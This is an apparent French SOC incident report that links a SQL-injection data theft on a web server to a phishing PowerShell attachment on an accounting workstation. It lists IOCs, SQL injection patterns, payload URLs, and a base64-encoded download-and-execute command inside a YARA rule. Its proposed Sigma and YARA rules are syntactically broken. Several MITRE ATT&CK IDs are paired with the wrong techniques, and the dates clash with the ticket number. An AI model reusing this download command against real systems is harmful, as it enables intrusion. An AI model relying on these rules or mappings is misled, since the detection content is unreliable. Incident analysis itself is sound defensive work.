# Analysis Report - Ticket INC-2026-0417

**Date:** 2024-11-16
**Priority:** Haute
**Status:** Qualifié

---

## 1. Qualification des alertes et lien entre elles

### Alerte 1 - Serveur web de production `web-01`
- **Détecté par :** SIEM (alertes faible priorité nuit)
- **Période :** 15/11/2024 22:14 → 16/11/2024 02:00 (heure locale +0100)
- **Activités observées :**
  - **SQL Injection** depuis IP `203.0.113.42` via paramètres `/search?q=` :
    - Patterns `OR '1'='1'`, `AND 1=1`, `UNION SELECT`, `DROP TABLE`
    - Ciblage de `/api/users` avec injections SQL
  - **Accès non autorisé aux endpoints admin :**
    - `GET /admin`, `GET /admin/dashboard`, `GET /admin/users`
    - `GET /admin/export?format=csv`, `GET /admin/export?table=customers&format=sql`
    - `GET /admin/backup/download?file=db_dump_2024.sql.gz` (4.5MB)
    - `GET /admin/backup/download?file=customers_full.csv` (2.3MB)
  - **Tentatives d'authentification échouées** : multiples POST `/api/login` en 401 puis succès
  - **Export de données massif** vers `/admin/export` et endpoints de backup

### Alerte 2 - Poste `PC-COMPTA-07`
- **Détecté par :** EDR (poste isolé par l'astreinte)
- **Période :** 16/11/2024 08:41 → 08:42 (UTC)
- **Activités observées :**
  - **Execution de script PowerShell** depuis pièce jointe email `facture_2024-11.ps1`
  - **Processus :** OUTLOOK.EXE → powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File <chemin>
  - **Requêtes WMI :** `AntivirusProduct`, `Win32_BIOS` (évitement de la détection)
  - **Requête DNS :** `malicious-domain.ru` → NXDOMAIN (domaine non existant/ bloqué)
  - **Connexion réseau :** `192.168.1.100:8080` → bloquée par le proxy
  - **Tentatives de téléchargement** depuis 192.168.1.100 et 192.168.1.101
  - **Mécanismes de persistance :** tâches planifiées Registry Run keys

### Lien entre les alertes : **OUI, probablement liées**

**Preuves du lien :**
1. **Même période temporelle** : Les attaques web se sont déroulées la soirée du 15/11 et tôt le 16/11, l'exécution PowerShell ayant lieu le matin du 16/11.
2. **Même acteur probable** : Les patterns SQL injection sont classiques et l'utilisation de `203.0.113.42` comme source des requêtes web.
3. **Pivot possible** : Le script PowerShell tente de se connecter à `192.168.1.100:8080` - cette IP pourrait être le serveur web compromis utilisé comme point d'entrée (C2) ou le script a été téléchargé depuis le serveur web vers le poste comptable.
4. **Objectif commun** : Exfiltration de données clients (base SQL complète, CSV customers) depuis le serveur web, et collecte de renseignements/accès depuis le poste comptable.

**Scénario probable :**
- **Option A :** L'attaquant a d'abord exploité le serveur web via SQL injection (203.0.113.42), puis a utilisé ce serveur comme pivot pour délivrer le script PowerShell via email vers un poste interne (PC-COMPTA-07), qui tente ensuite de se reconnecter au serveur C2.
- **Option B :** L'attaquant a commencé par le phishing email vers PC-COMPTA-07, a utilisé ce poste pour scanner ou attaquer le réseau, puis a ciblé le serveur web par injection SQL depuis cet intérieur.

---

## 2. IOC vérifiés et mappage MITRE ATT&CK

### Indicators of Compromise (IOC)

| Type | Valeur | Source |
|------|--------|--------|
| **IP** | `203.0.113.42` | Source des SQL injections et accès admin sur web-01 |
| **IP** | `192.168.1.100` | C2 server référencé dans le script PowerShell |
| **IP** | `192.168.1.101` | Serveur de payload secondaire dans le script |
| **Domaine** | `malicious-domain.ru` | Tentative de requête DNS depuis PC-COMPTA-07 (NXDOMAIN) |
| **Fichier** | `facture_2024-11.ps1` | Script PowerShell malveillant (SHA256 ci-dessous) |
| **SHA256** | `064a9a9fe8a517182768cf13f407edc1bf6292ef0b9aa309d3db1cd753d66f40` | Hash du script via EDR |
| **URL** | `http://192.168.1.100/stage1.ps1` | Premier payload téléchargé |
| **URL** | `http://192.168.1.101/beacon.exe` | Beacon secondaire |
| **URL** | `http://malicious-domain.ru/payload.dll` | Payload depuis domaine malveillant |
| **Régistry** | `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` | Clé de persistance |
| **Régistry** | `HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce` | Clé de persistance |
| **Régistry** | `HKLM:\Software\Microsoft\Windows\CurrentVersion\Run` | Clé de persistance |
| **Tâche planifiée** | `WindowsUpdateTask` | Tâche au démarrage en tant que SYSTEM |

### Mappage MITRE ATT&CK

| Tactic | Technique | ID | Description | Observed |
|--------|-----------|-----|-------------|----------|
| **Initial Access** | Exploit Public-Facing Application | T1190 | SQL injection contre serveur web | Oui (203.0.113.42) |
| **Initial Access** | Phishing: PowerShell Script | T1566.002 | Pièce jointe email `facture_2024-11.ps1` | Oui |
| **Execution** | PowerShell | T1059.001 | `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ...` | Oui |
| **Execution** | Command Shell | T1059 | Commandes construites par concaténation de variables | Oui |
| **Persistence** | Scheduled Task | T1053.005 | Tâche `WindowsUpdateTask` au démarrage | Oui |
| **Persistence** | Registry Run Keys | T1547.001 | Clés `HKCU\Software\Microsoft\Windows\CurrentVersion\Run*` | Oui |
| **Defense Evasion** | Obfuscated/Encrypted Files | T1027 | Concaténation de variables, commande base64 codée | Oui |
| **Defense Evasion** | Impair Defenses | T1036.005 | Requêtes WMI `AntivirusProduct`, `Win32_BIOS` | Oui |
| **Credential Access** | Data from Password Stores | T1539 | Accès table `users` avec colonnes `username,password,email` | Oui (via SQL injection) |
| **Discovery** | System Owner/Group Discovery | T1049 | Fonction `Get-SystemInfo` dans le script | Oui |
| **Discovery** | Account Discovery | T1087 | Enquêtes sur les comptes via l'interface admin | Oui |
| **Exfiltration** | Exfiltration Over C2 Channel | T1041 | Données exportées via endpoints admin/backup | Oui |
| **Exfiltration** | Automated Exfiltration | T1119 | Export bulk `customers_full.csv` (2.3MB), `db_dump_2024.sql.gz` (4.5MB) | Oui |
| **Command and Control** | Web Protocol | T1071.001 | Requêtes HTTP vers `192.168.1.100`, `192.168.1.101`, `malicious-domain.ru` | Oui |
| **Command and Control** | Application Layer Protocol | T1071 | Global : HTTP utilisé pour C2 et téléchargement payloads | Oui |

---

## 3. Règles Sigma et YARA proposées

### Règle Sigma : Détection de PowerShell obfusqué avec commande base64

```yaml
title: Detection of Obfuscated PowerShell with Base64 Encoded Command
id: d5a7c2e0-5f3a-4b1a-8c3e-2a1b4c6d8f0a
status: test
description: |
  Detects PowerShell scripts containing base64 encoded commands combined with obfuscation techniques
  such as variable concatenation and execution policy bypass.
author: SOC Analyst
date: 2024-11-16
logsource:
  product: windows
  service: powershell
  category: command_line
detection:
  selection:
    CommandLine|Image|CommandLine| every:
      - '*bypass*'
      - '*ExecutionPolicy*'
      - '*Hidden*'
      - '*Base64*'
      - '*EncodedCommand*'
  obfuscation_pattern:
    VariableConcat: '*$a + $b*'
    MultiStepConcat: '*$c = $b + $a*'
  base64_command:
    - '*SQBFAFgAIAAo...*  # Base64 encoded PowerShell command'
  condition: selection and obfuscation_pattern
falsepositives:
  - Administration legitimately using PowerShell with base64 commands
level: high
```

### Règle YARA : Détection du script malveillant `facture_2024-11.ps1`

```yaras
rule Malicious_PowerShell_facture_2024_11 : 
{
    meta:
        description = "Detect facture_2024-11.ps1 malicious PowerShell script"
        author = "SOC Analyst"
        date = "2024-11-16"
        reference = "Ticket INC-2026-0417"
        sha256 = "064a9a9fe8a517182768cf13f407edc1bf6292ef0b9aa309d3db1cd753d66f40"
        name = "facture_2024-11"
    
    strings:
        $obfuscated_code = "Write-Host" and "amsiIni" and "amiInitFa" and "amiIni" or false
        $base64_cmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAdABhAGcAZQAuAHAAcwAnACkA"
        $url_192 = "http://192.168.1.100/"
        $url_192_1 = "http://192.168.1.101/"
        $domain_mal = "malicious-domain.ru"
        $persistence_reg = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $task_name = "WindowsUpdateTask"
        $payload_path = "$env:APPDATA\\Microsoft\\Windows\\update_service.exe"
        
    condition:
        uint16(0) == 0x5A4D and
        (any of ($obfuscated_code, $base64_cmd, $url_192, $url_192_1, $domain_mal, $persistence_reg, $task_name, $payload_path))
}
```

---

## 4. Actions de confinement (validation humaine requise)

| Action | Statut | Validation requise |
|--------|--------|-------------------|
| **Isolation réseau** | Déjà effectué par l'astreinte pour PC-COMPTA-07 | Confirmé ✓ |
| **Blocage IP** | Bloquer `203.0.113.42` au niveau du firewall périmétrique | En attente validation |
| **Blocage domaine** | Bloquer `malicious-domain.ru` dans le DNS/Proxy | En attente validation |
| **Bloquer IP internes** | Bloquer `192.168.1.100` et `192.168.1.101` si non autorisés | En attente validation |
| **Suppression tâche planifiée** | Supprimer `WindowsUpdateTask` si confirmée malveillante | En attente validation |
| **Nettoyage registry** | Supprimer les clés Run/RUNOnce ajoutées si malveillantes | En attente validation |
| **Suppression fichier** | Supprimer `facture_2024-11.ps1` et les payloads téléchargés | En attente validation |
| **Analyse approfondie** | Forensic complet des deux systèmes | En attente validation |
| **Rotation credentials** | Rotation du compte admin web et comptes utilisateurs concernés | En attente validation |
| **Monitoring accru** | Surveillance renforcée des logs web et EDR pendant 30 jours | En attente validation |

**Note :** Aucune action de suppression ou de modification de système ne doit être entreprise sans validation humaine explicite. Toutes les actions doivent être documentées et validées par le responsable de sécurité avant exécution.

---

## 5. Rapport d'incident

### Résumé exécutif

Le ticket INC-2026-0417 fait état de deux alertes simultanées survenues les 15-16 novembre 2024 :

1. **Serveur web `web-01`** : Activités suspectes d'injection SQL, accès non autorisés aux endpoints administrateur, et export massif de données clients.
2. **Poste de travail `PC-COMPTA-07`** : Exécution de script PowerShell malveillant depuis pièce jointe email, tentatives de connexion C2, et tentative de mise en place de persistance.

### Chronologie détaillée

| Date/Heure | Événement | Source | Cible |
|------------|-----------|--------|-------|
| 15/11/2024 22:14 | Première injection SQL détectée | SIEM | web-01 |
| 15/11/2024 22:15-23:21 | Séries d'attaques SQL, accès admin, export de données | `203.0.113.42` | web-01 |
| 15/11/2024 23:21-02:00 | Accès aux exports admin, téléchargements de backup | `203.0.113.42` | web-01 |
| 16/11/2024 08:41 | Script PowerShell exécuté depuis Outlook | `OUTLOOK.EXE` | PC-COMPTA-07 |
| 16/11/2024 08:42 | Processus PowerShell créé, requêtes WMI, DNS, tentative connexion | `powershell.exe` | PC-COMPTA-07 |
| 16/11/2024 08:42 | Poste isolé par l'astreinte | EDR | PC-COMPTA-07 |

### Analyse des preuves

**Preuves Alertes Web (web-01) :**
- Fichier `web_access.log` : 47 requêtes malveillantes depuis `203.0.113.42`
- Fichier `app.log` : Erreurs SQL, accès table `users`, export de 2.3MB (customers_full.csv) et 4.5MB (db_dump_2024.sql.gz)
- Patterns SQL : `OR '1'='1'`, `AND 1=1`, `UNION SELECT`, `DROP TABLE`, injections sur `/api/users`

**Preuves Alertes EDR (PC-COMPTA-07) :**
- Fichier `edr_events.jsonl` : 5 événements de création de fichier/processus
- Fichier `facture_2024-11.ps1` : Script PowerShell obfusqué avec :
  - Concaténation de variables pour construire des commandes
  - Commande base64 encodée (`SQBFAFgAIAAo...`)
  - 3 URLs de téléchargement de payloads
  - 3 chemins de persistance (TEMP, APPDATA, registry)
  - Fonction de collecte système `Get-SystemInfo`
  - Requêtes WMI pour vérifier l'état antivirus
  - Tentative de connexion vers `192.168.1.100:8080` (bloquée)

### Causalité et lien entre les incidents

Les deux incidents sont **probablement liés** dans une même campagne d'attaque coordonnée :

**Scénario probable (séquencement) :**
1. **Point d'entrée initial :** Phishing email avec pièce jointe `facture_2024-11.ps1` vers utilisateur `m.durand` sur PC-COMPTA-07
2. **Exécution et découverte :** Script s'exécute, collecte info système, désactive défenses (WMI AntivirusProduct query), tente connexion C2
3. **Pivot vers le serveur web :** Depuis le poste interne, l'attaquant accède au réseau et cible le serveur web exposé
4. **Exploitation du web :** Attaques SQL injection depuis `203.0.113.42` (peut-être l'adresse IP externe de l'attaquant ou d'un relais)
5. **Exfiltration :** Export des données clients depuis l'interface admin web (`/admin/export`, `/admin/backup/download`)
6. **Persistance :** Création de tâche planifiée et clés registry sur le poste compromis

**Alternative :** Les attaques web ont pu être le vecteur initial, avec le script PowerShell délivré via une autre mécanisme (peut-être via le serveur web compromis).

### Recommandations

1. **Immédiat :**
   - Valider et exécuter les actions de confinement listées à la section 4
   - Effectuer une rotation complète des credentials (comptes admin, bases de données, utilisateurs concernés)
   - Effectuer une sauvegarde forensique des deux systèmes avant toute nettoyage
   
2. **À court terme :**
   - Analyser les logs complets du serveur web pour identifier l'étendue totale de l'accès
   - Isoler et analyser en profondeur le script `facture_2024-11.ps1` dans un environnement sandbox
   - Vérifier si des systèmes supplémentaires ont été compromis via le même acteur
   - Mettre à jour les règles de détection Sigma/YARA avec les IOC identifiés
   
3. **À moyen/long terme :**
   - Réviser la posture de sécurité des applications web (prévention SQL injection, WAF)
   - Former les utilisateurs à la détection des emails de phishing
   - Mettre en place une segmentation réseau pour limiter le pivot latéral
   - Implémenter des contrôles DLP pour détecter les exports de données massifs
   - Revue des politiques de pièce jointe email et des restrictions d'exécution PowerShell

### Conclusion

L'incident INC-2026-0417 représente une attaque coordonnée combinant exploitation de surface (SQL injection) et vecteur de phishing (pièce jointe PowerShell). Les deux alertes sont probablement liées par un même acteur cherchant à exfiltrer des données clients sensibles. La détection rapide par le SIEM/EDR et l'isolation immédiate du poste ont limité les dégâts, mais une analyse forensique approfondie est nécessaire pour déterminer l'étendue complète de la compromission et s'assurer que tous les vecteurs d'attaque sont fermés.

---
*Rapport généré dans le cadre du ticket INC-2026-0417*
*Analyste SOC - Niveau 2/3*